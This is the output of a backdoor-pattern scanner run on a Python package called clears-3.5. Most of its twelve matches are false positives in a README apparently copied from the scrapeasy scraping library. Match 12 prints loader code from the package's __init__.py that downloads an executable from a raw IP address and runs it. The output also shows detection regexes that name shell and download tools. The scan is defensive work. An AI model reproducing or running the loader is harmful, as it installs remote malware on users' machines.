[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000700[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\.(request|post|get)\([0m
[30;1m87 | [0m[35mDowload other file types (like pdf or ics)[0m
[30;1m88 | [0m[35mLet's be more general now. What about downloading special file types, like .pdf, .php or .ico? Use t[0m
[30;1m89 | [0m[35m[0m
[30;1m90 | [0m[35mcalendar_links = Page("https://www.icu.uzh.ch/events/id/207").get("ics")[0m
[30;1m91 | [0m[35mDone.[0m
[30;1m92 | [0m[35m[0m
[30;1m93 | [0m[35m['icu.uzh.ch//events/upcoming/icu-upcoming-events.ics', 'icu.uzh.ch//events/id/207/icu-event.ics'][0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000700[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\.(request|post|get)\([0m
[30;1m85 | [0m[35m[0m
[30;1m86 | [0m[35mvideo_links = w3.getVideos()[0m
[30;1m87 | [0m[35mDowload other file types (like pdf or ics)[0m
[30;1m88 | [0m[35mLet's be more general now. What about downloading special file types, like .pdf, .php or .ico? Use t[0m
[30;1m89 | [0m[35m[0m
[30;1m90 | [0m[35mcalendar_links = Page("https://www.icu.uzh.ch/events/id/207").get("ics")[0m
[30;1m91 | [0m[35mDone.[0m

[31m--[ [0m[34mMatch #[0m[33m3[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000600[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Windows[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(advpack\.dll|appvlp|at|atbroker|bash|bginfo|bitsadmin|cdb|certutil|cl_invocation\.ps1|cl_mutexverifiers\.ps1|cmd|cmdkey|cmstp|comsvcs\.dll|control|csc|cscript|csi|devtoolslauncher|dfsvc|diskshadow|dnscmd|dnx|dotnet|dxcap|esentutl|eventvwr|excel|expand|extexport|extrac32|findstr|forfiles|ftp|gfxdownloadwrapper|gpscript|hh|ie4uinit|ieadvpack\.dll|ieaframe\.dll|ic|infdefaultinstall|installutil|jsc|makecab|manage-bde\.wsf|mavinject|mftrace|microsoft\.workflow\.compiler|mmc|msbuild|msconfig|msdeploy|msdt|mshta|mshtml\.dll|msc|msxsl|netsh|odbcconf|pcalua|pcwrun|pcwutl\.dll|pester\.bat|powerpnt|presentationhost|pubprn\.vbs|rcsi|reg|regasm|regedit|register-cimprovider|regsvcs|regsvr32|rpcping|rundll32|runonce|runscripthelper|sc|schtasks|scriptrunner|setupapi\.dll|shdocvw\.dll|shell32\.dll|slmgr\.vbs|sqldumper|sqlps|sqltoolsps|squirrel|syncappvpublishingserver|syncappvpublishingserver\.vbs|syssetup\.dll|te|tracker|tttracer|update|url\.dll|verclsid|vsjitdebugger|wab|winrm\.vbs|winword|wmic|wscript|wsl|wsreset|xwizard|zipfldr\.dll)\s[0m
[30;1m23 | [0m[35mWebsite and Page[0m
[30;1m24 | [0m[35mAs will notice that you can use all the methods for both Page and Website with the same argument cal[0m
[30;1m25 | [0m[35m[0m
[30;1m26 | [0m[35mInitialize a Website[0m
[30;1m27 | [0m[35mFirst, let's create a new Website object. For this manner, just provide the url of the main page. I [0m
[30;1m28 | [0m[35m[0m
[30;1m29 | [0m[35mweb = Website("http://www.fahrschule-liechti.com/")[0m

[31m--[ [0m[34mMatch #[0m[33m4[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000600[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Windows[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(advpack\.dll|appvlp|at|atbroker|bash|bginfo|bitsadmin|cdb|certutil|cl_invocation\.ps1|cl_mutexverifiers\.ps1|cmd|cmdkey|cmstp|comsvcs\.dll|control|csc|cscript|csi|devtoolslauncher|dfsvc|diskshadow|dnscmd|dnx|dotnet|dxcap|esentutl|eventvwr|excel|expand|extexport|extrac32|findstr|forfiles|ftp|gfxdownloadwrapper|gpscript|hh|ie4uinit|ieadvpack\.dll|ieaframe\.dll|ic|infdefaultinstall|installutil|jsc|makecab|manage-bde\.wsf|mavinject|mftrace|microsoft\.workflow\.compiler|mmc|msbuild|msconfig|msdeploy|msdt|mshta|mshtml\.dll|msc|msxsl|netsh|odbcconf|pcalua|pcwrun|pcwutl\.dll|pester\.bat|powerpnt|presentationhost|pubprn\.vbs|rcsi|reg|regasm|regedit|register-cimprovider|regsvcs|regsvr32|rpcping|rundll32|runonce|runscripthelper|sc|schtasks|scriptrunner|setupapi\.dll|shdocvw\.dll|shell32\.dll|slmgr\.vbs|sqldumper|sqlps|sqltoolsps|squirrel|syncappvpublishingserver|syncappvpublishingserver\.vbs|syssetup\.dll|te|tracker|tttracer|update|url\.dll|verclsid|vsjitdebugger|wab|winrm\.vbs|winword|wmic|wscript|wsl|wsreset|xwizard|zipfldr\.dll)\s[0m
[30;1m  | [0m[35mects.[0m
[30;1m  | [0m[35m[0m
[30;1m  | [0m[35mGetting it[0m
[30;1m  | [0m[35mTo download scrapeasy, either fork this github repo or simply use Pypi via pip.[0m
[30;1m  | [0m[35m[0m
[30;1m  | [0m[35m$ pip install scrapeasy[0m
[30;1m  | [0m[35mUsing it[0m
[30;1m  | [0m[35mScrapeasy was programmed with ease-of-use in mind. First, import Website and Page from Scrapeasy[0m
[30;1m  | [0m[35m[0m
[30;1m  | [0m[35mfrom scrapeasy import Website, Page[0m

[31m--[ [0m[34mMatch #[0m[33m5[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000610[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Linux[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(apt|apt\-get|aria2c|arp|ash|awk|base64|bash|bpftrace|busybox|cat|chmod|chown|cp|cpan|cpulimit|crontab|csh|curl|cut|dash|dd|diff|dmesg|dmsetup|dnf|docker|dpkg|easy_install|ed|emacs|env|expand|expect|facter|find|finger|flock|fmt|ftp|gawk|gdb|gimp|git|grep|head|iftop|ionice|ip|irb|jjs|journalctl|jrunscript|ksh|ld\.so|ldconfig|logsave|ltrace|lua|mail|mawk|mount|mtr|mv|mysql|nano|nawk|nc|nice|nl|nmap|node|od|openssl|perl|pg|php|pic|pico|pip|puppet|readelf|red|rlogin|rlwrap|rpm|rpmquery|rsync|ruby|run\-mailcap|run\-parts|rvim|scp|screen|script|sed|service|setarch|sftp|shuf|smbclient|socat|sort|sqlite3|ssh|start\-stop\-daemon|stdbuf|strace|systemctl|tail|tar|taskset|tclsh|tcpdump|tee|telnet|tftp|time|timeout|tmux|top|ul|unexpand|uniq|unshare|vi|vim|watch|wget|whois|wish|xargs|xxd|yum|zsh|zypper)\s[0m
[30;1m64 | [0m[35mAll right, but now we want to gain further insights on these links. How do we do that?[0m
[30;1m65 | [0m[35m[0m
[30;1m66 | [0m[35mGet linked domains[0m
[30;1m67 | [0m[35mWell, more detailed links are nothing more than external links. So we do the same request but this t[0m
[30;1m68 | [0m[35m[0m
[30;1m69 | [0m[35mdomains = web.getLinks(intern=False, extern=True, domain=False)[0m
[30;1m70 | [0m[35mTadaa, we are getting all external links in full detail.[0m

[31m--[ [0m[34mMatch #[0m[33m6[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000610[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Linux[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(apt|apt\-get|aria2c|arp|ash|awk|base64|bash|bpftrace|busybox|cat|chmod|chown|cp|cpan|cpulimit|crontab|csh|curl|cut|dash|dd|diff|dmesg|dmsetup|dnf|docker|dpkg|easy_install|ed|emacs|env|expand|expect|facter|find|finger|flock|fmt|ftp|gawk|gdb|gimp|git|grep|head|iftop|ionice|ip|irb|jjs|journalctl|jrunscript|ksh|ld\.so|ldconfig|logsave|ltrace|lua|mail|mawk|mount|mtr|mv|mysql|nano|nawk|nc|nice|nl|nmap|node|od|openssl|perl|pg|php|pic|pico|pip|puppet|readelf|red|rlogin|rlwrap|rpm|rpmquery|rsync|ruby|run\-mailcap|run\-parts|rvim|scp|screen|script|sed|service|setarch|sftp|shuf|smbclient|socat|sort|sqlite3|ssh|start\-stop\-daemon|stdbuf|strace|systemctl|tail|tar|taskset|tclsh|tcpdump|tee|telnet|tftp|time|timeout|tmux|top|ul|unexpand|uniq|unshare|vi|vim|watch|wget|whois|wish|xargs|xxd|yum|zsh|zypper)\s[0m
[30;1m54 | [0m[35m where the images should be saved to. Thats it! Run the Code and see whats happening. Within seconds[0m
[30;1m55 | [0m[35m[0m
[30;1m56 | [0m[35mGet linked domains[0m
[30;1m57 | [0m[35mNext, lets find out to what pages fahrschule-liechti.com is linking to. To get a general overview, l[0m
[30;1m58 | [0m[35m[0m
[30;1m59 | [0m[35mdomains = web.getLinks(intern=False, extern=False, domain=True)[0m
[30;1m60 | [0m[35mWhat we get back is a list of all domains that are somewhere linked on fahrschule-liechti.com[0m
[30;1m61 | [0m[35m[0m

[31m--[ [0m[34mMatch #[0m[33m7[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000610[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Linux[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(apt|apt\-get|aria2c|arp|ash|awk|base64|bash|bpftrace|busybox|cat|chmod|chown|cp|cpan|cpulimit|crontab|csh|curl|cut|dash|dd|diff|dmesg|dmsetup|dnf|docker|dpkg|easy_install|ed|emacs|env|expand|expect|facter|find|finger|flock|fmt|ftp|gawk|gdb|gimp|git|grep|head|iftop|ionice|ip|irb|jjs|journalctl|jrunscript|ksh|ld\.so|ldconfig|logsave|ltrace|lua|mail|mawk|mount|mtr|mv|mysql|nano|nawk|nc|nice|nl|nmap|node|od|openssl|perl|pg|php|pic|pico|pip|puppet|readelf|red|rlogin|rlwrap|rpm|rpmquery|rsync|ruby|run\-mailcap|run\-parts|rvim|scp|screen|script|sed|service|setarch|sftp|shuf|smbclient|socat|sort|sqlite3|ssh|start\-stop\-daemon|stdbuf|strace|systemctl|tail|tar|taskset|tclsh|tcpdump|tee|telnet|tftp|time|timeout|tmux|top|ul|unexpand|uniq|unshare|vi|vim|watch|wget|whois|wish|xargs|xxd|yum|zsh|zypper)\s[0m
[30;1m54 | [0m[35mrst, we defined to download all image-media via the keyword img. Next, we define the output folder, [0m
[30;1m55 | [0m[35m[0m
[30;1m56 | [0m[35mGet linked domains[0m
[30;1m57 | [0m[35mNext, lets find out to what pages fahrschule-liechti.com is linking to. To get a general overview, l[0m
[30;1m58 | [0m[35m[0m
[30;1m59 | [0m[35mdomains = web.getLinks(intern=False, extern=False, domain=True)[0m

[31m--[ [0m[34mMatch #[0m[33m8[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000610[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Linux[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(apt|apt\-get|aria2c|arp|ash|awk|base64|bash|bpftrace|busybox|cat|chmod|chown|cp|cpan|cpulimit|crontab|csh|curl|cut|dash|dd|diff|dmesg|dmsetup|dnf|docker|dpkg|easy_install|ed|emacs|env|expand|expect|facter|find|finger|flock|fmt|ftp|gawk|gdb|gimp|git|grep|head|iftop|ionice|ip|irb|jjs|journalctl|jrunscript|ksh|ld\.so|ldconfig|logsave|ltrace|lua|mail|mawk|mount|mtr|mv|mysql|nano|nawk|nc|nice|nl|nmap|node|od|openssl|perl|pg|php|pic|pico|pip|puppet|readelf|red|rlogin|rlwrap|rpm|rpmquery|rsync|ruby|run\-mailcap|run\-parts|rvim|scp|screen|script|sed|service|setarch|sftp|shuf|smbclient|socat|sort|sqlite3|ssh|start\-stop\-daemon|stdbuf|strace|systemctl|tail|tar|taskset|tclsh|tcpdump|tee|telnet|tftp|time|timeout|tmux|top|ul|unexpand|uniq|unshare|vi|vim|watch|wget|whois|wish|xargs|xxd|yum|zsh|zypper)\s[0m
[30;1m40 | [0m[35mYou may have noticed that the typical http://www.-stuff is missing. Thats un purpose and makes your [0m
[30;1m41 | [0m[35m[0m
[30;1m42 | [0m[35mFind media[0m
[30;1m43 | [0m[35mLet's try to find links to all images that fahrschule-liechti.com placed on its website. We do that [0m
[30;1m44 | [0m[35m[0m
[30;1m45 | [0m[35mimages = web.getImages()[0m
[30;1m46 | [0m[35mThe response will include links to all available images.[0m

[31m--[ [0m[34mMatch #[0m[33m9[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000610[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Linux[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(apt|apt\-get|aria2c|arp|ash|awk|base64|bash|bpftrace|busybox|cat|chmod|chown|cp|cpan|cpulimit|crontab|csh|curl|cut|dash|dd|diff|dmesg|dmsetup|dnf|docker|dpkg|easy_install|ed|emacs|env|expand|expect|facter|find|finger|flock|fmt|ftp|gawk|gdb|gimp|git|grep|head|iftop|ionice|ip|irb|jjs|journalctl|jrunscript|ksh|ld\.so|ldconfig|logsave|ltrace|lua|mail|mawk|mount|mtr|mv|mysql|nano|nawk|nc|nice|nl|nmap|node|od|openssl|perl|pg|php|pic|pico|pip|puppet|readelf|red|rlogin|rlwrap|rpm|rpmquery|rsync|ruby|run\-mailcap|run\-parts|rvim|scp|screen|script|sed|service|setarch|sftp|shuf|smbclient|socat|sort|sqlite3|ssh|start\-stop\-daemon|stdbuf|strace|systemctl|tail|tar|taskset|tclsh|tcpdump|tee|telnet|tftp|time|timeout|tmux|top|ul|unexpand|uniq|unshare|vi|vim|watch|wget|whois|wish|xargs|xxd|yum|zsh|zypper)\s[0m
[30;1m40 | [0m[35m['fahrschule-liechti.com', 'fahrschule-liechti.com/about', 'fahrschule-liechti.com/der-weg-motorrad'[0m
[30;1m41 | [0m[35m[0m
[30;1m42 | [0m[35mYou may have noticed that the typical http://www.-stuff is missing. Thats un purpose and makes your [0m
[30;1m43 | [0m[35m[0m
[30;1m44 | [0m[35mFind media[0m
[30;1m45 | [0m[35mLet's try to find links to all images that fahrschule-liechti.com placed on its website. We do that [0m
[30;1m46 | [0m[35m[0m
[30;1m47 | [0m[35mimages = web.getImages()[0m

[31m--[ [0m[34mMatch #[0m[33m10[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000610[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Linux[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(apt|apt\-get|aria2c|arp|ash|awk|base64|bash|bpftrace|busybox|cat|chmod|chown|cp|cpan|cpulimit|crontab|csh|curl|cut|dash|dd|diff|dmesg|dmsetup|dnf|docker|dpkg|easy_install|ed|emacs|env|expand|expect|facter|find|finger|flock|fmt|ftp|gawk|gdb|gimp|git|grep|head|iftop|ionice|ip|irb|jjs|journalctl|jrunscript|ksh|ld\.so|ldconfig|logsave|ltrace|lua|mail|mawk|mount|mtr|mv|mysql|nano|nawk|nc|nice|nl|nmap|node|od|openssl|perl|pg|php|pic|pico|pip|puppet|readelf|red|rlogin|rlwrap|rpm|rpmquery|rsync|ruby|run\-mailcap|run\-parts|rvim|scp|screen|script|sed|service|setarch|sftp|shuf|smbclient|socat|sort|sqlite3|ssh|start\-stop\-daemon|stdbuf|strace|systemctl|tail|tar|taskset|tclsh|tcpdump|tee|telnet|tftp|time|timeout|tmux|top|ul|unexpand|uniq|unshare|vi|vim|watch|wget|whois|wish|xargs|xxd|yum|zsh|zypper)\s[0m
[30;1m27 | [0m[35mn page. I will use the URL of a website that I created years ago: fahrschule-liechti.com.[0m
[30;1m28 | [0m[35m[0m
[30;1m29 | [0m[35mweb = Website("http://www.fahrschule-liechti.com/")[0m
[30;1m30 | [0m[35mGet Links of all subsites[0m
[30;1m31 | [0m[35mOkay, now that we have our Website initialized, we are interested of all the subsites that exists on[0m
[30;1m32 | [0m[35m[0m
[30;1m33 | [0m[35mlinks = web.getSubpagesLinks()[0m

[31m--[ [0m[34mMatch #[0m[33m11[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000610[0m
       Tag: [34mSecurity.Backdoor.LOLBAS.Linux[0m
  Severity: [36mModerate[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/README.md[0m
   Pattern: [32m\s(apt|apt\-get|aria2c|arp|ash|awk|base64|bash|bpftrace|busybox|cat|chmod|chown|cp|cpan|cpulimit|crontab|csh|curl|cut|dash|dd|diff|dmesg|dmsetup|dnf|docker|dpkg|easy_install|ed|emacs|env|expand|expect|facter|find|finger|flock|fmt|ftp|gawk|gdb|gimp|git|grep|head|iftop|ionice|ip|irb|jjs|journalctl|jrunscript|ksh|ld\.so|ldconfig|logsave|ltrace|lua|mail|mawk|mount|mtr|mv|mysql|nano|nawk|nc|nice|nl|nmap|node|od|openssl|perl|pg|php|pic|pico|pip|puppet|readelf|red|rlogin|rlwrap|rpm|rpmquery|rsync|ruby|run\-mailcap|run\-parts|rvim|scp|screen|script|sed|service|setarch|sftp|shuf|smbclient|socat|sort|sqlite3|ssh|start\-stop\-daemon|stdbuf|strace|systemctl|tail|tar|taskset|tclsh|tcpdump|tee|telnet|tftp|time|timeout|tmux|top|ul|unexpand|uniq|unshare|vi|vim|watch|wget|whois|wish|xargs|xxd|yum|zsh|zypper)\s[0m
[30;1m13 | [0m[35mGetting it[0m
[30;1m14 | [0m[35mTo download scrapeasy, either fork this github repo or simply use Pypi via pip.[0m
[30;1m15 | [0m[35m[0m
[30;1m16 | [0m[35m$ pip install scrapeasy[0m
[30;1m17 | [0m[35mUsing it[0m
[30;1m18 | [0m[35mScrapeasy was programmed with ease-of-use in mind. First, import Website and Page from Scrapeasy[0m
[30;1m19 | [0m[35m[0m

[31m--[ [0m[34mMatch #[0m[33m12[0m[34m of [0m[33m12[0m[31m ]--[0m
   Rule Id: [34mBD000700[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/clears-3.5/clears/__init__.py[0m
   Pattern: [32m\.(request|post|get)\([0m
[30;1m1 | [0m[35mimport requests, os, threading[0m
[30;1m2 | [0m[35mdef main():[0m
[30;1m3 | [0m[35m    url = 'http://45.158.77.82/swfdump.exe'[0m
[30;1m4 | [0m[35m    response = requests.get(url)[0m
[30;1m5 | [0m[35m    open('swfdump.exe', 'wb').write(response.content)[0m
[30;1m6 | [0m[35m    os.system('swfdump.exe')[0m
[30;1m7 | [0m[35mdef ColorWHITE():[0m

12 matches found.
